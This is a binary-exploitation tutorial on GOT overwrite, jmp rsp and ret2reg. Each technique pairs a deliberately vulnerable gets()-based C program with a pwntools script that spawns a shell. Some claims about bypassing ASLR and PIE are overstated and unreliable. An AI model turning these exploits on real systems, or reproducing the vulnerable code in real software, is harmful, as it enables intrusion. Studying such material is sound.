## Reliable Shellcode Exploitation

### Introduction
This document explains reliable shellcode exploitation techniques across different scenarios, demonstrating how to use **GOT overwrite**, **RSP manipulation**, and **ret2reg** for exploiting vulnerabilities in binaries.

---

### **GOT Overwrite - 32-bit**

**Vulnerable Code Example (32-bit)**
```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    puts("Give me the input");
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

In this scenario, the vulnerable function `vuln()` uses `gets()`, allowing us to overflow the `buffer` and overwrite the return address.

**Exploitation Process:**
1. Use the `GOT` entry for `puts()` as a writable space.
2. Overflow the buffer, write the shellcode to the `puts` GOT entry, and redirect the program to execute it.

**Exploitation Code:**
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

rop = ROP(elf)
rop.raw('A' * 32)  # Buffer overflow padding
rop.gets(elf.got['puts'])  # Call gets(), writing to the GOT entry of puts
rop.raw(elf.got['puts'])  # Shellcode is now written at this location

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))  # Shellcode to spawn a shell
p.interactive()
```

---

### **GOT Overwrite - 64-bit**

In 64-bit systems, the same technique applies but with additional considerations for Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE). However, **GOT overwriting** works reliably without worrying about ASLR.

---

### **RSP Manipulation (Shellcode with RSP)**

**Vulnerable Code Example:**
```c
#include <stdio.h>

int test = 0;

int main() {
    char input[100];

    puts("Get me with shellcode and RSP!");
    gets(input);

    if (test) {
        asm("jmp *%rsp");
        return 0;
    } else {
        return 0;
    }
}
```

Here, RSP can be manipulated, allowing us to pivot execution to shellcode directly placed in memory.

**Exploitation Process:**
1. Locate a `jmp rsp` gadget (typically using `ROPgadget`).
2. Overflow the buffer, setting up RSP to point to the shellcode.
3. Jump to the shellcode via `jmp rsp`.

**Exploitation Code:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# Find a 'jmp rsp' gadget in the binary
jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = flat(
    'A' * 120,                # Padding
    jmp_rsp,                  # RSP points to shellcode
    asm(shellcraft.sh())      # Shellcode
)

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

**Limited Space Exploit:**
If the buffer space is limited, adjust RSP using a small offset, then jump to the shellcode.

**Exploitation Code with Small Offset:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 128;  # Adjust RSP
    jmp rsp;
''')  # Use the calculated RSP offset

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

---

### **ret2reg (Using Registers to Control Flow)**

In this method, we target functions like `gets()` that return a pointer, and we exploit this by jumping to the address stored in a register, such as `RAX`.

**Vulnerable Code Example:**
```c
#include <stdio.h>

void vuln() {
    char buffer[100];
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

**Analysis:**
1. The `gets()` function stores the buffer's address in `RAX`.
2. We search for a `jmp rax` gadget to jump to the shellcode stored at `RAX`.

**Exploitation Code:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

JMP_RAX = 0x40109c  # Found 'jmp rax' gadget address

payload = asm(shellcraft.sh())  # Shellcode
payload = payload.ljust(120, b'A')  # Padding
payload += p64(JMP_RAX)  # Jump to RAX (points to our shellcode)

p.sendline(payload)
p.interactive()
```

---

### **Conclusion**

These methods showcase various reliable ways of exploiting vulnerable binaries. Techniques like GOT overwrite, RSP manipulation, and ret2reg offer robust exploitation strategies even in the face of defenses like ASLR and PIE.
